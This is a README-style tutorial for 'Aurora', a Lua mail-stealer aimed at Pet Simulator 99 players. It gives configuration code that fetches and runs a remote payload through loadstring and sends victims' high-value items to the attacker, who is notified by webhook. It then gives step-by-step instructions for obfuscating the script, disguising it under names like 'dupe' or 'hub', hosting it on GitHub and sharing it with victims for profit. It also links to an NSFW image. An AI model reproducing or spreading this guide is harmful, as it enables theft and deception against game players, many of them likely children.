# I had made a tutorial for my mailstealer (for pet simulator99) [Aurora](https://discord.gg/Eh7EX6dzAF) feel free to join my server, do not run anything you see here you will lose your stuf!!! this is a direct copy and paste of my tutorial from the discord
Alright chat this is a tutorial  
Since everyone's stupid and can't understand lua 😭  
And I don't have the resources to host a 24/7 mailsteal creator bot So here's a tutorial So I'll be explaining most of the shit  
# 1 getting your webhook
video tutorial below:  
[![Click me!](https://img.youtube.com/vi/video-id/0.jpg)](https://github.com/Enivzoy/Aurora/raw/main/pics/webhook.mp4)
From my [partner<3](https://discord.gg/CxhY6rpUCA)
# 2: setting up the lua code

Get the script from ⁠[script channel from discord](https://discord.com/channels/1226830019939143690/1227851051634266193)
It should look like this:
```lua
Username = "your user here"
Username2 = "your 2nd user here" -- stuff will get sent to this user if first user's mailbox is full
Webhook = "your webhook here"
min_rap = 500000 -- minimum rap of each item you want to get sent to you.

keySystemEnabled = true -- wether you want to enable key system or not
hubName = "Hubname | Keysystem" -- self explain
keyLink = "https://example.com/" -- the link wehere yoi cam get your keys this can be a discord invite
keys = {"key1", "key2", "andsoon"} -- the keys for your key system

loadstring(game:HttpGet('https://raw.githubusercontent.com/Enivzoy/Utilz/main/lua/rblx/AuroraTils/mainframe'))()
```
Now I will update the script more  
So don't copy the script from here incase a major rewrite/bugs go join the [discord](https://discord.gg/Eh7EX6dzAF) for updated script  
So as per [update 4.6/keysystem1.2](https://discord.com/channels/1226830019939143690/1227851051634266193/1240374560046714910) the script is updated   
Make sure you have a ps99 account which can receive mail, Aka must have reached area 10. It's better to use a alt account (or 2 alt accounts incase you get banned)  
So the `Username` should be your username for like the account to receive the mail  
For example `Username = "GetAuroraMS"`  
Now here's the tricky part  
If you have an alt  
You need to fill in the `Username2` also  
If you happen to have your mains mailbox full it will send to username2  
Now if this value(Username2) is kept empty/removed then it'll be set to my ign(only if the value is empty or removed completely) to avoid errors(no this isn't dualhooking, it's a failsafe)  
~~If I'm nice I might return the items~~  
Now the webhook, You should've gotten the webhook from step 1 So put it to the `Webhook` value  
For example `Webhook = "discord.com/x/x`  
  
Now minimum rap, Minimum rap means the item has to be the same or above the rap you put into the script   
  
Now let's say you have min rap to about 1m, And you hit a guy with 500k
You won't get anything because the min rap is 1m  
Now minrap is calculated based on whole numbers(no "m" or "k" if it's 6k then it should be 6000 if it's 1m then it should be 1000000)  
So if your into the high stuff  
Set your min rap to 1-3m  
# key system (ohh boi this gon be hard to explain(i think so?))  
So key system is like a gui that opens when you run the script  
You can enable this (it's enabled by default) by setting the `keySystemEnabled` value to true  
If you dont want key system  
Just set it to false `keySystemEnabled = false`  
Or remove everything related to it (keySystemEnabled, hubName, keyLink, keys !!!!DO NOT TOUCH THE LOADSTRING!!!!)  
I think you can figure rest of the stuff out  
now after doing everything you save your script to a file call it mailsetaler.txt and save it somewhere(using notepad or a file editor) then go to step 3(part2)  
Make sure to [DM](https://discord.gg/Eh7EX6dzAF) me if you cant follow something  I'll help you   
  
# 3: obfuscation & uploading
Now you gotta obfuscate your bot so people don't spam your webhook  
I'll be showing you how to use moonsec in this tutorial  
aight  
so first you gotta join **[moonsex](https://discord.gg/2Eah77h8KC)**  
you dm this bot  
![Preview](https://cdn.discordapp.com/attachments/1240373088063983767/1240554599815843851/image.png?ex=6646fc00&is=6645aa80&hm=c00059eb81d41af59246559ce05a91eaec6fe9c490db324228a0ee55a37fb126&)  
then you send the file you saved(mailsetaler.txt - ⁠[#tutorial-since-stupid⁠](https://discord.com/channels/1226830019939143690/1240373088063983767/1240376735581601934)) to the bot  
you will see smth like this  
![Image](https://cdn.discordapp.com/attachments/1240373088063983767/1240555304484212778/image.png?ex=6646fca8&is=6645ab28&hm=e403deb16ee5097d3ad0f4d7d13d64a2f71e97a3de3eabfbf4d055d99174af7a&)  
click this   
![Image](https://cdn.discordapp.com/attachments/1240373088063983767/1240555577516752957/image.png?ex=6646fcea&is=6645ab6a&hm=b01cb252bd11400c8d78656accf3422644a40c39a9e474bf1b16be970566403c&)   
then you click this  
![Image](https://cdn.discordapp.com/attachments/1240373088063983767/1240555948314202132/image.png?ex=6646fd42&is=6645abc2&hm=5e25be2cf8ea0ebfdfec50181b99cd40eac73ccd3acb85ab8dfdf7fbeef9f5d3&)  
it should look like this now  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/dba1dd35-2c3f-42de-b1b2-01b8b975daf3)  
then click all of these  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/0fb68965-064c-45e9-ae9b-7b5dc71f45bb)  
then click obfuscate  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/4d17cc43-574c-488c-a72b-b1f3fdcb9690)  
it willl show this embed click on the **[Click Here]** to download the file  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/d0202540-2646-4475-8a05-f2c6b2cef77f)  
you will have to do a linkvertise  
once you get your file(THIS WILL BE DIFFERENT FOR EVERYONE)  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/8aa2dd5f-b35d-4a46-b239-366481d74d2b)  
rename it to something else like "loader" "exec" "dupe" "tradescam" "arkohub", "aurorahub" etc etc
![image](https://github.com/Enivzoy/Aurora/assets/130647229/32598d66-be6d-41d3-96f7-090ab96dd1e9)
# Now uploading
create your account at [github](https://github.com/)  
your homepage should look like this  
![Image](https://cdn.discordapp.com/attachments/1240373088063983767/1240558027157934100/image.png?ex=6646ff32&is=6645adb2&hm=adb18e7598664a0ac26dbcbe0d8e8ea41cea89dee44ff07923b8c4a9eb5e9e80&)  
clickk this  
![Image](https://cdn.discordapp.com/attachments/1240373088063983767/1240558199116140584/image.png?ex=6646ff5b&is=6645addb&hm=f1cec2fc885f0a64552c64bf6153e61052b96a34d3c740606f4b87573f454243&)  
click new repository  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/0782fd97-53b3-4633-a9a0-b7c383d7fa00)  
it will open this page  
![Image](https://cdn.discordapp.com/attachments/1240373088063983767/1240558489231953921/image.png?ex=6646ffa0&is=6645ae20&hm=197bb89a6471aba248a44fe8a1f28651b414a95353cf59c5ef4f2a0f00f57ca5&)  
click create repo when filling in everything  
![Image](https://cdn.discordapp.com/attachments/1240373088063983767/1240558688423510017/image.png?ex=6646ffcf&is=6645ae4f&hm=252937aa1796623521a705bea3941a1c2df600fed9717a6510ec4c3f14a5b2cc&)   
it will now show this   
![Image](https://cdn.discordapp.com/attachments/1240373088063983767/1240558792157040723/image.png?ex=6646ffe8&is=6645ae68&hm=50af32f57953c5e37732994dff3c29b9758984266c349ab2c6b671201cb9ab2e&)  
click  uploading an existing file  
![Image](https://cdn.discordapp.com/attachments/1240373088063983767/1240558918015647774/image.png?ex=66470006&is=6645ae86&hm=69cf068aab1fc306b93d1e024919c032102b09e9544e239f4892ed41c7eeb329&)  
it will open this  
![Image](https://cdn.discordapp.com/attachments/1240373088063983767/1240559024924000266/image.png?ex=66470020&is=6645aea0&hm=218cd3f3460bcafc85b1735fec8d25d7d869bc2c783fb72912e38b7399d65e21&)  
find where you had saved your file ([#⁠tutorial-since-stupid](https://discord.com/channels/1226830019939143690/1240373088063983767/1240556624561832037)⁠ TILL⁠ [#tutorial-since-stupid⁠](https://discord.com/channels/1226830019939143690/1240373088063983767/1240557422091698176)) for me its loader saved in downloads folder  
![Image](https://cdn.discordapp.com/attachments/1240373088063983767/1240559309784612924/image.png?ex=66470063&is=6645aee3&hm=43daaffdb521616038afa74a314ef65bc9325ed804c8867abef887b674459059&)  
drag and drop your file  
![Image](https://cdn.discordapp.com/attachments/1240373088063983767/1240559469205913600/image.png?ex=66470089&is=6645af09&hm=b55d0ff1ef2b1d1b85707de94f60de1f99f603b03ab874bc257c8667be64ca49&)  
once uploaded click commit changes  
![Image](https://cdn.discordapp.com/attachments/1240373088063983767/1240559673501814784/image.png?ex=664700ba&is=6645af3a&hm=6a240985d7a85cd90c53b08b87dd5688edfbbb2e70ec97d64716a1989ee9c47e&)  
if youve done everything right to this point it should look like this  
![Image](https://cdn.discordapp.com/attachments/1240373088063983767/1240559816875970642/image.png?ex=664700dc&is=6645af5c&hm=31253e6aa23e6eced61432a3cf8440d62c331a3d320af266186237f88cdaa1ea&)  
click your file  
![Image](https://cdn.discordapp.com/attachments/1240373088063983767/1240559950447771689/image.png?ex=664700fc&is=6645af7c&hm=8646488d24043feb95148a50b2ef0e1c93fac4bdabc2b37318403b4798c99627&)  
it should open this up, then click raw  
![Image](https://cdn.discordapp.com/attachments/1240373088063983767/1240560086980497431/image.png?ex=6647011d&is=6645af9d&hm=f245933b5d8685c95f89496c88ccf57a774e468e5db0a611eea3284258268148&)  
you will see this mess  
![Image](https://cdn.discordapp.com/attachments/1240373088063983767/1240560206887260262/image.png?ex=66470139&is=6645afb9&hm=97fa956118a1ed90222e0580202ce8b3eb58eebc28266688a6d0db15ef111f27&)  
copy the url for me it is https://raw.githubusercontent.com/Enivzoy/Aurora/main/loader  
![Image](https://cdn.discordapp.com/attachments/1240373088063983767/1240560332368510986/image.png?ex=66470157&is=6645afd7&hm=3f0426b6aadc9d427da50fd1983e72f33f64bce6e7f3600ccb82e70a49568215&)   
then you put the raw link into a loadstring  
`loadstring(game:HttpGet('RAW LINK HERE'))()`  
for me it is `loadstring(game:HttpGet('https://raw.githubusercontent.com/Enivzoy/Aurora/main/loader'))()`  
  
  
now you share the script  
and porfit  
profit  
make sure to dm me your profits  
so i can advertise it 👍  
if you dont understand something make sure to dmme  
# thanks to my discord server, arko and levox and future partners for providing me with resources and etc

  
since you read everything heres a nsfw pic
<details>
  <summary>:) warning dont open this infront of parents xD</summary>  
    
  ![Preview](https://raw.githubusercontent.com/Enivzoy/Aurora/master/pics/w.png)
</details>
